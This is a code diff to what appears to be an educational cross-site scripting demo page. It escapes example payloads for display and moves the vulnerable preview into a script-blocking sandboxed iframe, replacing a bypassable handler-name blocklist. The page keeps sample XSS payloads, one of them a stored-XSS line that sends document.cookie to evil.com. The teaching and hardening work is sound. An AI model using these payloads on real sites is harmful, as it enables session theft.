@@ -317,7 +317,7 @@
                     <div class="preview-header vulnerable">
                         <span>Vulnerable (innerHTML)</span>
                     </div>
-                    <div class="preview-content" id="vulnerable-preview"></div>
+                    <iframe class="preview-content" id="vulnerable-preview" sandbox="allow-same-origin" title="Vulnerable preview (sandboxed - script execution disabled)" style="width:100%; height:150px; border:0; display:block; box-sizing:border-box;"></iframe>
                     <div style="padding: 0 1rem 1rem;">
                         <small style="color: #666;">User input rendered directly as HTML</small>
                     </div>
@@ -390,7 +390,7 @@ element.<span class="tag">textContent</span> = userInput;
             <h3>1. Reflected XSS</h3>
             <p>Payload is reflected off the web server in error messages, search results, or any response that includes user input.</p>
             <div class="code-block">
-<pre><code>// URL: https://example.com/search?q=<script>alert(1)</script>
+<pre><code>// URL: https://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;
 
 // Vulnerable server code:
 app.get('/search', (req, res) => {
@@ -404,7 +404,7 @@ app.get('/search', (req, res) => {
             <p>Payload is permanently stored on target server (database, comment field, forum post).</p>
             <div class="code-block">
 <pre><code>// Attacker posts comment:
-<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
+&lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;
 
 // Every user who views the page executes the script
 // Most dangerous type - affects all users</code></pre>
@@ -413,7 +413,7 @@ app.get('/search', (req, res) => {
             <h3>3. DOM-based XSS</h3>
             <p>Payload is executed as a result of modifying the DOM environment in the victim's browser.</p>
             <div class="code-block">
-<pre><code>// URL: https://example.com/page#<img src=x onerror=alert(1)>
+<pre><code>// URL: https://example.com/page#&lt;img src=x onerror=alert(1)&gt;
 
 // Vulnerable JavaScript:
 document.getElementById('content').innerHTML = location.hash.slice(1);
@@ -579,22 +579,24 @@ Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
             // Secure preview - always safe
             securePreview.textContent = input;
 
-            // For vulnerable preview, show how it WOULD render (but don't actually execute scripts)
-            // Replace script tags with visible representation
-            let displayHTML = input
+            // Vulnerable preview: render the raw input as real HTML (as innerHTML
+            // would) inside a sandboxed iframe with no "allow-scripts" token, so
+            // the browser itself refuses to run any script or event handler that
+            // results - a real security boundary, not a JS-level blocklist of
+            // handler names (which is exactly the anti-pattern this page teaches
+            // against, and which was previously bypassable via handlers like
+            // ontoggle that weren't on the list). Script tags are escaped to
+            // visible text below purely so the demo still shows what was typed
+            // instead of the (inert either way) <script> element silently
+            // vanishing - it has no bearing on safety.
+            const displayHTML = input
                 .replace(/<script/gi, '&lt;script')
                 .replace(/<\/script>/gi, '&lt;/script&gt;');
 
-            // Show other HTML but neutralize dangerous handlers
-            displayHTML = displayHTML
-                .replace(/onerror\s*=/gi, 'data-onerror=')
-                .replace(/onload\s*=/gi, 'data-onload=')
-                .replace(/onclick\s*=/gi, 'data-onclick=')
-                .replace(/onmouseover\s*=/gi, 'data-onmouseover=')
-                .replace(/onfocus\s*=/gi, 'data-onfocus=')
-                .replace(/javascript:/gi, 'javascript-disabled:');
-
-            vulnerablePreview.innerHTML = displayHTML;
+            const frameDoc = vulnerablePreview.contentDocument;
+            frameDoc.open();
+            frameDoc.write('<!DOCTYPE html><html><head><style>body{margin:0;padding:1.5rem;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;font-size:0.95rem;color:#212529;overflow-wrap:break-word;}</style></head><body>' + displayHTML + '</body></html>');
+            frameDoc.close();
 
             // Detect XSS patterns
             const xssPatterns = [
